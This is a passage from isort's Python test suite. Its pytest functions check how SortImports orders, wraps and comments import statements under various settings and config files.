    test_input = (""from foo import bar  # My Comment\n"")
    assert SortImports(file_contents=test_input).output == test_input

    # More complicated case
    test_input = (""from a import b  # My Comment1\n""
                  ""from a import c  # My Comment2\n"")
    assert SortImports(file_contents=test_input).output == \
                      (""from a import b  # My Comment1\n""
                       ""from a import c  # My Comment2\n"")

    # Test case where imports comments make imports extend pass the line length
    test_input = (""from a import b # My Comment1\n""
                  ""from a import c # My Comment2\n""
                  ""from a import d\n"")
    assert SortImports(file_contents=test_input, line_length=45).output == \
                      (""from a import b  # My Comment1\n""
                       ""from a import c  # My Comment2\n""
                       ""from a import d\n"")

    # Test case where imports with comments will be beyond line length limit
    test_input = (""from a import b, c  # My Comment1\n""
                  ""from a import c, d # My Comment2 is really really really really long\n"")
    assert SortImports(file_contents=test_input, line_length=45).output == \
                      (""from a import (  # My Comment1; My Comment2 is really really really really long\n""
                       ""    b, c, d)\n"")

    # Test that comments are not stripped from 'import ... as ...' by default
    test_input = (""from a import b as bb  # b comment\n""
                  ""from a import c as cc  # c comment\n"")
    assert SortImports(file_contents=test_input).output == test_input

    # Test that 'import ... as ...' comments are not collected inappropriately
    test_input = (""from a import b as bb  # b comment\n""
                  ""from a import c as cc  # c comment\n""
                  ""from a import d\n"")
    assert SortImports(file_contents=test_input).output == test_input
    assert SortImports(file_contents=test_input, combine_as_imports=True).output == (
        ""from a import b as bb, c as cc, d  # b comment; c comment\n""
    )


def test_multiline_split_on_dot():
    """"""Test to ensure isort correctly handles multiline imports, even when split right after a '.'""""""
    test_input = (""from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.\\\n""
                  ""    my_module import my_function"")
    assert SortImports(file_contents=test_input, line_length=70).output == \
            (""from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.my_module import \\\n""
             ""    my_function\n"")


def test_import_star():
    """"""Test to ensure isort handles star imports correctly""""""
    test_input = (""from blah import *\n""
                  ""from blah import _potato\n"")
    assert SortImports(file_contents=test_input).output == (""from blah import *\n""
                                                            ""from blah import _potato\n"")
    assert SortImports(file_contents=test_input, combine_star=True).output == (""from blah import *\n"")


def test_include_trailing_comma():
    """"""Test for the include_trailing_comma option""""""
    test_output_grid = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.GRID,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_grid == (
        ""from third_party import (lib1, lib2,\n""
        ""                         lib3, lib4,)\n""
    )

    test_output_vertical = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical == (
        ""from third_party import (lib1,\n""
        ""                         lib2,\n""
        ""                         lib3,\n""
        ""                         lib4,)\n""
    )

    test_output_vertical_indent = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_indent == (
        ""from third_party import (\n""
        ""    lib1,\n""
        ""    lib2,\n""
        ""    lib3,\n""
        ""    lib4,\n""
        "")\n""
    )

    test_output_vertical_grid = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_GRID,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_grid == (
        ""from third_party import (\n""
        ""    lib1, lib2, lib3, lib4,)\n""
    )

    test_output_vertical_grid_grouped = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_grid_grouped == (
        ""from third_party import (\n""
        ""    lib1, lib2, lib3, lib4,\n""
        "")\n""
    )

    test_output_wrap_single_import_with_use_parentheses = SortImports(
        file_contents=SINGLE_FROM_IMPORT,
        line_length=25,
        include_trailing_comma=True,
        use_parentheses=True
    ).output
    assert test_output_wrap_single_import_with_use_parentheses == (
        ""from third_party import (\n""
        ""    lib1,)\n""
    )

    test_output_wrap_single_import_vertical_indent = SortImports(
        file_contents=SINGLE_FROM_IMPORT,
        line_length=25,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
        include_trailing_comma=True,
        use_parentheses=True
    ).output
    assert test_output_wrap_single_import_vertical_indent == (
        ""from third_party import (\n""
        ""    lib1,\n""
        "")\n""
    )


def test_similar_to_std_library():
    """"""Test to ensure modules that are named similarly to a standard library import don't end up clobbered""""""
    test_input = (""import datetime\n""
                  ""\n""
                  ""import requests\n""
                  ""import times\n"")
    assert SortImports(file_contents=test_input, known_third_party=[""requests"", ""times""]).output == test_input


def test_correctly_placed_imports():
    """"""Test to ensure comments stay on correct placement after being sorted""""""
    test_input = (""from a import b # comment for b\n""
                  ""from a import c # comment for c\n"")
    assert SortImports(file_contents=test_input, force_single_line=True).output == \
                      (""from a import b  # comment for b\n""
                       ""from a import c  # comment for c\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b  # comment for b\n""
                                                            ""from a import c  # comment for c\n"")

    # Full example test from issue #143
    test_input = (""from itertools import chain\n""
                  ""\n""
                  ""from django.test import TestCase\n""
                  ""from model_mommy import mommy\n""
                  ""\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d""
                  ""efinition\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d""
                  ""efinition_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_p""
                  ""latform\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta""
                  ""il_model\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta""
                  ""il_model_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini""
                  ""tion\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini""
                  ""tion_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_platfo""
                  ""rm\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo""
                  ""del\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo""
                  ""del_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import create_download_usage_right\n""
                  ""from apps.clientman.commands.download_usage_rights import delete_download_usage_right\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d""
                  ""efinition\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d""
                  ""efinition_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_p""
                  ""latform\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta""
                  ""il_model\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta""
                  ""il_model_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import get_download_rights_for_item\n""
                  ""from apps.clientman.commands.download_usage_rights import get_right\n"")
    assert SortImports(file_contents=test_input, force_single_line=True, line_length=140,
                       known_third_party=[""django"", ""model_mommy""]).output == test_input


def test_auto_detection():
    """"""Initial test to ensure isort auto-detection works correctly - will grow over time as new issues are raised.""""""

    # Issue 157
    test_input = (""import binascii\n""
                  ""import os\n""
                  ""\n""
                  ""import cv2\n""
                  ""import requests\n"")
    assert SortImports(file_contents=test_input, known_third_party=[""cv2"", ""requests""]).output == test_input

    # alternative solution
    assert SortImports(file_contents=test_input, default_section=""THIRDPARTY"").output == test_input


def test_same_line_statements():
    """"""Ensure isort correctly handles the case where a single line contains multiple statements including an import""""""
    test_input = (""import pdb; import nose\n"")
    assert SortImports(file_contents=test_input).output == (""import pdb\n""
                                                            ""\n""
                                                            ""import nose\n"")

    test_input = (""import pdb; pdb.set_trace()\n""
                  ""import nose; nose.run()\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_long_line_comments():
    """"""Ensure isort correctly handles comments at the end of extremely long lines""""""
    test_input = (""from foo.utils.fabric_stuff.live import check_clean_live, deploy_live, sync_live_envdir, ""
                  ""update_live_app, update_live_cron  # noqa\n""
                  ""from foo.utils.fabric_stuff.stage import check_clean_stage, deploy_stage, sync_stage_envdir, ""
                  ""update_stage_app, update_stage_cron  # noqa\n"")
    assert SortImports(file_contents=test_input).output == \
                (""from foo.utils.fabric_stuff.live import (check_clean_live, deploy_live,  # noqa\n""
                 ""                                         sync_live_envdir, update_live_app, update_live_cron)\n""
                 ""from foo.utils.fabric_stuff.stage import (check_clean_stage, deploy_stage,  # noqa\n""
                 ""                                          sync_stage_envdir, update_stage_app, update_stage_cron)\n"")


def test_tab_character_in_import():
    """"""Ensure isort correctly handles import statements that contain a tab character""""""
    test_input = (""from __future__ import print_function\n""
                  ""from __future__ import\tprint_function\n"")
    assert SortImports(file_contents=test_input).output == ""from __future__ import print_function\n""


def test_split_position():
    """"""Ensure isort splits on import instead of . when possible""""""
    test_input = (""from p24.shared.exceptions.master.host_state_flag_unchanged import HostStateUnchangedException\n"")
    assert SortImports(file_contents=test_input, line_length=80).output == \
                                            (""from p24.shared.exceptions.master.host_state_flag_unchanged import \\\n""
                                             ""    HostStateUnchangedException\n"")


def test_place_comments():
    """"""Ensure manually placing imports works as expected""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings\n""
                  ""\n""
                  ""# isort:imports-thirdparty\n""
                  ""# isort:imports-firstparty\n""
                  ""print('code')\n""
                  ""\n""
                  ""# isort:imports-stdlib\n"")
    expected_output = (""\n# isort:imports-thirdparty\n""
                       ""import django.settings\n""
                       ""\n""
                       ""# isort:imports-firstparty\n""
                       ""import myproject.test\n""
                       ""\n""
                       ""print('code')\n""
                       ""\n""
                       ""# isort:imports-stdlib\n""
                       ""import os\n""
                       ""import sys\n"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == expected_output
    test_output = SortImports(file_contents=test_output, known_third_party=['django']).output
    assert test_output == expected_output


def test_placement_control():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""import sys\n""
                  ""from bottle import Bottle, redirect, response, run\n""
                  ""import p24.imports._argparse as argparse\n""
                  ""import p24.imports._subprocess as subprocess\n""
                  ""import p24.imports._VERSION as VERSION\n""
                  ""import p24.shared.media_wiki_syntax as syntax\n"")
    test_output = SortImports(file_contents=test_input,
                known_first_party=['p24', 'p24.imports._VERSION'],
                known_standard_library=['p24.imports'],
                known_third_party=['bottle'],
                default_section=""THIRDPARTY"").output

    assert test_output == (""import os\n""
                           ""import p24.imports._argparse as argparse\n""
                           ""import p24.imports._subprocess as subprocess\n""
                           ""import sys\n""
                           ""\n""
                           ""from bottle import Bottle, redirect, response, run\n""
                           ""\n""
                           ""import p24.imports._VERSION as VERSION\n""
                           ""import p24.shared.media_wiki_syntax as syntax\n"")


def test_custom_sections():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""import sys\n""
                  ""from django.conf import settings\n""
                  ""from bottle import Bottle, redirect, response, run\n""
                  ""import p24.imports._argparse as argparse\n""
                  ""from django.db import models\n""
                  ""import p24.imports._subprocess as subprocess\n""
                  ""import pandas as pd\n""
                  ""import p24.imports._VERSION as VERSION\n""
                  ""import numpy as np\n""
                  ""import p24.shared.media_wiki_syntax as syntax\n"")
    test_output = SortImports(file_contents=test_input,
                known_first_party=['p24', 'p24.imports._VERSION'],
                import_heading_stdlib='Standard Library',
                import_heading_thirdparty='Third Party',
                import_heading_firstparty='First Party',
                import_heading_django='Django',
                import_heading_pandas='Pandas',
                known_standard_library=['p24.imports'],
                known_third_party=['bottle'],
                known_django=['django'],
                known_pandas=['pandas', 'numpy'],
                default_section=""THIRDPARTY"",
                sections=[""FUTURE"", ""STDLIB"", ""DJANGO"", ""THIRDPARTY"", ""PANDAS"", ""FIRSTPARTY"", ""LOCALFOLDER""]).output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import p24.imports._argparse as argparse\n""
                           ""import p24.imports._subprocess as subprocess\n""
                           ""import sys\n""
                           ""\n""
                           ""# Django\n""
                           ""from django.conf import settings\n""
                           ""from django.db import models\n""
                           ""\n""
                           ""# Third Party\n""
                           ""from bottle import Bottle, redirect, response, run\n""
                           ""\n""
                           ""# Pandas\n""
                           ""import numpy as np\n""
                           ""import pandas as pd\n""
                           ""\n""
                           ""# First Party\n""
                           ""import p24.imports._VERSION as VERSION\n""
                           ""import p24.shared.media_wiki_syntax as syntax\n"")


def test_glob_known():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""from django_whatever import whatever\n""
                  ""import sys\n""
                  ""from django.conf import settings\n""
                  ""from . import another\n"")
    test_output = SortImports(file_contents=test_input,
                import_heading_stdlib='Standard Library',
                import_heading_thirdparty='Third Party',
                import_heading_firstparty='First Party',
                import_heading_django='Django',
                import_heading_djangoplugins='Django Plugins',
                import_heading_localfolder='Local',
                known_django=['django'],
                known_djangoplugins=['django_*'],
                default_section=""THIRDPARTY"",
                sections=[""FUTURE"", ""STDLIB"", ""DJANGO"", ""DJANGOPLUGINS"", ""THIRDPARTY"", ""FIRSTPARTY"", ""LOCALFOLDER""]).output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""# Django\n""
                           ""from django.conf import settings\n""
                           ""\n""
                           ""# Django Plugins\n""
                           ""from django_whatever import whatever\n""
                           ""\n""
                           ""# Local\n""
                           ""from . import another\n"")


def test_sticky_comments():
    """"""Test to ensure it is possible to make comments 'stick' above imports""""""
    test_input = (""import os\n""
                  ""\n""
                  ""# Used for type-hinting (ref: https://github.com/davidhalter/jedi/issues/414).\n""
                  ""from selenium.webdriver.remote.webdriver import WebDriver  # noqa\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""from django import forms\n""
                  ""# While this couples the geographic forms to the GEOS library,\n""
                  ""# it decouples from database (by not importing SpatialBackend).\n""
                  ""from django.contrib.gis.geos import GEOSException, GEOSGeometry\n""
                  ""from django.utils.translation import ugettext_lazy as _\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_zipimport():
    """"""Imports ending in ""import"" shouldn't be clobbered""""""
    test_input = ""from zipimport import zipimport\n""
    assert SortImports(file_contents=test_input).output == test_input


def test_from_ending():
    """"""Imports ending in ""from"" shouldn't be clobbered.""""""
    test_input = ""from foo import get_foo_from, get_foo\n""
    expected_output = ""from foo import get_foo, get_foo_from\n""
    assert SortImports(file_contents=test_input).output == expected_output


def test_from_first():
    """"""Tests the setting from_first works correctly""""""
    test_input = ""from os import path\nimport os\n""
    assert SortImports(file_contents=test_input, from_first=True).output == test_input


def test_top_comments():
    """"""Ensure correct behavior with top comments""""""
    test_input = (""# -*- encoding: utf-8 -*-\n""
                  ""# Test comment\n""
                  ""#\n""
                  ""from __future__ import unicode_literals\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n""
                  ""from django.utils.encoding import python_2_unicode_compatible\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# Comment\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_consistency():
    """"""Ensures consistency of handling even when dealing with non ordered-by-type imports""""""
    test_input = ""from sqlalchemy.dialects.postgresql import ARRAY, array\n""
    assert SortImports(file_contents=test_input, order_by_type=True).output == test_input


def test_force_grid_wrap():
    """"""Ensures removing imports works as expected.""""""
    test_input = (
      ""from bar import lib2\n""
      ""from foo import lib6, lib7\n""
    )
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=2,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
      ).output
    assert test_output == """"""from bar import lib2
from foo import (
    lib6,
    lib7
)
""""""
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=3,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
      ).output
    assert test_output == test_input


def test_force_grid_wrap_long():
    """"""Ensure that force grid wrap still happens with long line length""""""
    test_input = (
      ""from foo import lib6, lib7\n""
      ""from bar import lib2\n""
      ""from babar import something_that_is_kind_of_long""
    )
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=2,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
      line_length=9999,
      ).output
    assert test_output == """"""from babar import something_that_is_kind_of_long
from bar import lib2
from foo import (
    lib6,
    lib7
)
""""""


def test_uses_jinja_variables():
    """"""Test a basic set of imports that use jinja variables""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.{ test }\n""
                  ""import django.{ settings }"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              known_first_party=['myproject']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.{ settings }\n""
                           ""\n""
                           ""import myproject.{ test }\n"")

    test_input = (""import {{ cookiecutter.repo_name }}\n""
                  ""from foo import {{ cookiecutter.bar }}\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_fcntl():
    """"""Test to ensure fcntl gets correctly recognized as stdlib import""""""
    test_input = (""import fcntl\n""
                  ""import os\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_import_split_is_word_boundary_aware():
    """"""Test to ensure that isort splits words in a boundary aware manner""""""
    test_input = (""from mycompany.model.size_value_array_import_func import \\\n""
                ""    get_size_value_array_import_func_jobs"")
    test_output = SortImports(file_contents=test_input,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
      line_length=79).output
    assert test_output == (""from mycompany.model.size_value_array_import_func import (\n""
                           ""    get_size_value_array_import_func_jobs\n""
                           "")\n"")


def test_other_file_encodings(tmpdir):
    """"""Test to ensure file encoding is respected""""""
    for encoding in ('latin1', 'utf8'):
        tmp_fname = tmpdir.join('test_{0}.py'.format(encoding))
        file_contents = ""# coding: {0}\n\ns = u'ã'\n"".format(encoding)
        tmp_fname.write_binary(file_contents.encode(encoding))
        assert SortImports(file_path=str(tmp_fname), settings_path=os.getcwd()).output == file_contents


def test_comment_at_top_of_file():
    """"""Test to ensure isort correctly handles top of file comments""""""
    test_input = (""# Comment one\n""
                  ""from django import forms\n""
                  ""# Comment two\n""
                  ""from django.contrib.gis.geos import GEOSException\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_alphabetic_sorting():
    """"""Test to ensure isort correctly handles single line imports""""""
    test_input = (""import unittest\n""
                  ""\n""
                  ""import ABC\n""
                  ""import Zope\n""
                  ""from django.contrib.gis.geos import GEOSException\n""
                  ""from plone.app.testing import getRoles\n""
                  ""from plone.app.testing import ManageRoles\n""
                  ""from plone.app.testing import setRoles\n""
                  ""from Products.CMFPlone import utils\n""
                  )
    options = {'force_single_line': True,
               'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]

    output = SortImports(file_contents=test_input, known_first_party=['django'], **options).output
    assert output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_alphabetic_sorting_multi_line():
    """"""Test to ensure isort correctly handles multiline import see: issue 364""""""
    test_input = (""from a import (CONSTANT_A, cONSTANT_B, CONSTANT_C, CONSTANT_D, CONSTANT_E,\n""
                  ""               CONSTANT_F, CONSTANT_G, CONSTANT_H, CONSTANT_I, CONSTANT_J)\n"")
    options = {'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **options).output == test_input


def test_comments_not_duplicated():
    """"""Test to ensure comments aren't duplicated: issue 303""""""
    test_input = ('from flask import url_for\n'
                  ""# Whole line comment\n""
                  'from service import demo  # inline comment\n'
                  'from service import settings\n')
    output = SortImports(file_contents=test_input).output
    assert output.count(""# Whole line comment\n"") == 1
    assert output.count(""# inline comment\n"") == 1


def test_top_of_line_comments():
    """"""Test to ensure top of line comments stay where they should: issue 260""""""
    test_input = ('# -*- coding: utf-8 -*-\n'
                  'from django.db import models\n'
                  '#import json as simplejson\n'
                  'from myproject.models import Servidor\n'
                  '\n'
                  'import reversion\n'
                   '\n'
                   'import logging\n')
    output = SortImports(file_contents=test_input).output
    print(output)
    assert output.startswith('# -*- coding: utf-8 -*-\n')


def test_basic_comment():
    """"""Test to ensure a basic comment wont crash isort""""""
    test_input = ('import logging\n'
                  '# Foo\n'
                  'import os\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_shouldnt_add_lines():
    """"""Ensure that isort doesn't add a blank line when a top of import comment is present, issue #316""""""
    test_input = ('""""""Text""""""\n'
                  '# This is a comment\n'
                 'import pkg_resources\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_sections_parsed_correct(tmpdir):
    """"""Ensure that modules for custom sections parsed as list from config file and isort result is correct""""""
    conf_file_data = (
        '[settings]\n'
        'sections=FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON\n'
        'known_common=nose\n'
        'import_heading_common=Common Library\n'
        'import_heading_stdlib=Standard Library\n'
    )
    test_input = (
        'import os\n'
        'from nose import *\n'
        'import nose\n'
        'from os import path'
    )
    correct_output = (
        '# Standard Library\n'
        'import os\n'
        'from os import path\n'
        '\n'
        '# Common Library\n'
        'import nose\n'
        'from nose import *\n'
    )
    tmpdir.join('.isort.cfg').write(conf_file_data)
    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output


@pytest.mark.skipif(toml is None, reason=""Requires toml package to be installed."")
def test_pyproject_conf_file(tmpdir):
    """"""Ensure that modules for custom sections parsed as list from config file and isort result is correct""""""
    conf_file_data = (
        '[build-system]\n'
        'requires = [""setuptools"", ""wheel""]\n'
        '[tool.poetry]\n'
        'name = ""isort""\n'
        'version = ""0.1.0""\n'
        'license = ""MIT""\n'
        '[tool.isort]\n'
        'lines_between_types=1\n'
        'known_common=""nose""\n'
        'import_heading_common=""Common Library""\n'
        'import_heading_stdlib=""Standard Library""\n'
        'sections=""FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON""\n'
        'include_trailing_comma = true\n'
    )
    test_input = (
        'import os\n'
        'from nose import *\n'
        'import nose\n'
        'from os import path'
    )
    correct_output = (
        '# Standard Library\n'
        'import os\n'
        '\n'
        'from os import path\n'
        '\n'
        '# Common Library\n'
        'import nose\n'
        '\n'
        'from nose import *\n'
    )
    tmpdir.join('pyproject.toml').write(conf_file_data)
    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output


def test_alphabetic_sorting_no_newlines():
    '''Test to ensure that alphabetical sort does not erroneously introduce new lines (issue #328)'''
    test_input = ""import os\n""
    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True).output
    assert test_input == test_output

    test_input = ('import os\n'
                  'import unittest\n'
                  '\n'
                  'from a import b\n'
                  '\n'
                  '\n'
                  'print(1)\n')
    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True, lines_after_imports=2).output
    assert test_input == test_output


def test_sort_within_section():
    '''Test to ensure its possible to force isort to sort within sections'''
    test_input = ('from Foob import ar\n'
                  'import foo\n'
                  'from foo import bar\n'
                  'from foo.bar import Quux, baz\n')
    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True).output
    assert test_output == test_input

    test_input = ('import foo\n'
                  'from foo import bar\n'
                  'from foo.bar import baz\n'
                  'from foo.bar import Quux\n'
                  'from Foob import ar\n')
    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True, order_by_type=False,
                              force_single_line=True).output
    assert test_output == test_input


def test_sorting_with_two_top_comments():
    '''Test to ensure isort will sort files that contain 2 top comments'''
    test_input = ('#! comment1\n'
                  ""''' comment2\n""
                  ""'''\n""
                  'import b\n'
                  'import a\n')
    assert SortImports(file_contents=test_input).output == ('#! comment1\n'
                                                            ""''' comment2\n""
                                                            ""'''\n""
                                                            'import a\n'
                                                            'import b\n')


def test_lines_between_sections():
    """"""Test to ensure lines_between_sections works""""""
    test_input = ('from bar import baz\n'
                  'import os\n')
    assert SortImports(file_contents=test_input, lines_between_sections=0).output == ('import os\n'
                                                                                      'from bar import baz\n')
    assert SortImports(file_contents=test_input, lines_between_sections=2).output == ('import os\n\n\n'
                                                                                      'from bar import baz\n')


def test_forced_sepatate_globs():
    """"""Test to ensure that forced_separate glob matches lines""""""
    test_input = ('import os\n'
                  '\n'
                  'from myproject.foo.models import Foo\n'
                  '\n'
                  'from myproject.utils import util_method\n'
                  '\n'
                  'from myproject.bar.models import Bar\n'
                  '\n'
                  'import sys\n')
    test_output = SortImports(file_contents=test_input, forced_separate=['*.models'],
                              line_length=120).output

    assert test_output == ('import os\n'
                          'import sys\n'
                          '\n'
                          'from myproject.utils import util_method\n'
                          '\n'
                          'from myproject.bar.models import Bar\n'
                          'from myproject.foo.models import Foo\n')


def test_no_additional_lines_issue_358():
    """"""Test to ensure issue 358 is resolved and running isort multiple times does not add extra newlines""""""
    test_input = ('""""""This is a docstring""""""\n'
                  '# This is a comment\n'
                  'from __future__ import (\n'
                  '    absolute_import,\n'
                  '    division,\n'
                  '    print_function,\n'
                  '    unicode_literals\n'
                  ')\n')
    expected_output = ('""""""This is a docstring""""""\n'
                       '# This is a comment\n'
                       'from __future__ import (\n'
                       '    absolute_import,\n'
                       '    division,\n'
                       '    print_function,\n'
                       '    unicode_literals\n'
                       ')\n')
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    for attempt in range(5):
        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                  line_length=20).output
        assert test_output == expected_output

    test_input = ('""""""This is a docstring""""""\n'
                  '\n'
                  '# This is a comment\n'
                  'from __future__ import (\n'
                  '    absolute_import,\n'
                  '    division,\n'
                  '    print_function,\n'
                  '    unicode_literals\n'
                  ')\n')
    expected_output = ('""""""This is a docstring""""""\n'
                       '\n'
                       '# This is a comment\n'
                       'from __future__ import (\n'
                       '    absolute_import,\n'
                       '    division,\n'
                       '    print_function,\n'
                       '    unicode_literals\n'
                       ')\n')
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    for attempt in range(5):
        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                  line_length=20).output
        assert test_output == expected_output


def test_import_by_paren_issue_375():
    """"""Test to ensure isort can correctly handle sorting imports where the paren is directly by the import body""""""
    test_input = ('from .models import(\n'
                  '   Foo,\n'
                  '   Bar,\n'
                  ')\n')
    assert SortImports(file_contents=test_input).output == 'from .models import Bar, Foo\n'


def test_import_by_paren_issue_460():
    """"""Test to ensure isort can doesnt move comments around """"""
    test_input = """"""
# First comment
# Second comment
# third comment
import io
import os
""""""
    assert SortImports(file_contents=(test_input)).output == test_input


def test_function_with_docstring():
    """"""Test to ensure isort can correctly sort imports when the first found content is a function with a docstring""""""
    add_imports = ['from __future__ import unicode_literals']
    test_input = ('def foo():\n'
                  '    """""" Single line triple quoted doctring """"""\n'
                  '    pass\n')
    expected_output = ('from __future__ import unicode_literals\n'
                       '\n'
                       '\n'
                       'def foo():\n'
                       '    """""" Single line triple quoted doctring """"""\n'
                       '    pass\n')
    assert SortImports(file_contents=test_input, add_imports=add_imports).output == expected_output


def test_plone_style():
    """"""Test to ensure isort correctly plone style imports""""""
    test_input = (""from django.contrib.gis.geos import GEOSException\n""
                  ""from plone.app.testing import getRoles\n""
                  ""from plone.app.testing import ManageRoles\n""
                  ""from plone.app.testing import setRoles\n""
                  ""from Products.CMFPlone import utils\n""
                  ""\n""
                  ""import ABC\n""
                  ""import unittest\n""
                  ""import Zope\n"")
    options = {'force_single_line': True,
               'force_alphabetical_sort': True}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **options).output == test_input


def test_third_party_case_sensitive():
    """"""Modules which match builtins by name but not on case should not be picked up on Windows.""""""
    test_input = (""import thirdparty\n""
                  ""import os\n""
                  ""import ABC\n"")

    expected_output = ('import os\n'
                       '\n'
                       'import ABC\n'
                       'import thirdparty\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_exists_case_sensitive_file(tmpdir):
    """"""Test exists_case_sensitive function for a file.""""""
    tmpdir.join('module.py').ensure(file=1)
    assert exists_case_sensitive(str(tmpdir.join('module.py')))
    assert not exists_case_sensitive(str(tmpdir.join('MODULE.py')))


def test_exists_case_sensitive_directory(tmpdir):
    """"""Test exists_case_sensitive function for a directory.""""""
    tmpdir.join('pkg').ensure(dir=1)
    assert exists_case_sensitive(str(tmpdir.join('pkg')))
    assert not exists_case_sensitive(str(tmpdir.join('PKG')))


def test_sys_path_mutation(tmpdir):
    """"""Test to ensure sys.path is not modified""""""
    tmpdir.mkdir('src').mkdir('a')
    test_input = ""from myproject import test""
    options = {'virtual_env': str(tmpdir)}  # type: Dict[str, Any]
    expected_length = len(sys.path)
    SortImports(file_contents=test_input, **options).output
    assert len(sys.path) == expected_length


